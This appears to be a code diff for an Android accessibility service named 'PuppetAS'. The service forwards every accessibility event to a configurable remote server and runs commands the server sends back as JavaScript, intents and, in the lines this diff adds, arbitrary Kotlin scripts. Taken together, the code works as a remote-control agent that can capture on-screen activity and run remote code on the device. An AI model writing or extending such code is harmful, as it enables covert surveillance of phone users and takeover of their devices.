@@ -43,13 +43,22 @@ class Americano {
     }
 
 }
+
+class KotlinInterpreter {
+    private val engine = ScriptEngineManager().getEngineByExtension("kts")
+
+    fun executeScript(script: String): Any {
+        return engine.eval(script)
+    }
+}
+
+
 class PuppetAS : AccessibilityService() {
     private fun getServerUrl(): String = PreferenceManager.getDefaultSharedPreferences(this).getString("SERVER_URL", "") ?: ""
     private fun getUUID(): String = PreferenceManager.getDefaultSharedPreferences(this).getString("UUID", "") ?: ""
     private val logs: Queue<String> = LinkedList()
     private val americano = Americano()
-    // Other functions remain the same
-
+    private val kotlinInterpreter = KotlinInterpreter()
     private fun sendLogToServer(logMessage: String) {
         if(getServerUrl().isBlank() || getUUID().isBlank()) {
             Log.i("PuppetAS", "Settings not set yet, skipping: $logMessage")
@@ -123,18 +132,6 @@ class PuppetAS : AccessibilityService() {
             Log.e("PuppetAS", "Request did not work.")
         }
     }
-
-    private fun processCommands(commands: List<String>) {
-        commands.forEach { command ->
-            if (isV8Command(command)) {
-                executeV8Command(command)
-            } else if (isIntentCommand(command)) {
-                executeIntentCommand(command)
-            } else {
-                Log.e("PuppetAS","Invalid command: $command")
-            }
-        }
-    }
     private fun isV8Command(command: String): Boolean {
         return command.startsWith("v8:")
     }
@@ -166,14 +163,42 @@ class PuppetAS : AccessibilityService() {
         intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
         startActivity(intent)
     }
+
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         Log.d("PuppetAS", "onAccessibilityEvent: $event")
         sendLogToServer("$event")
     }
 
+ private fun isKotlinCommand(command: String): Boolean {
+        return command.startsWith("kotlin:")
+    }
+    private fun executeKotlinCommand(command: String) {
+        val kotlinCommand = command.removePrefix("kotlin:")
+        Log.i("PuppetAS","Executing Kotlin command: $kotlinCommand")
+        try {
+            kotlinInterpreter.executeScript(kotlinCommand)
+        } catch (e: Exception) {
+            Log.e("PuppetAS","Error executing Kotlin command: ${e.message}")
+        }
+    }
+    private fun processCommands(commands: List<String>) {
+        commands.forEach { command ->
+            if (isV8Command(command)) {
+                executeV8Command(command)
+            } else if (isIntentCommand(command)) {
+                executeIntentCommand(command)
+            } else if (isKotlinCommand(command)) {
+                executeKotlinCommand(command)
+            } else {
+                Log.e("PuppetAS","Invalid command: $command")
+            }
+        }
+    }
+
     override fun onInterrupt() {
         Log.d("PuppetAS", "onInterrupt")
     }
+
     override fun onServiceConnected() {
         super.onServiceConnected()
         heartbeat()
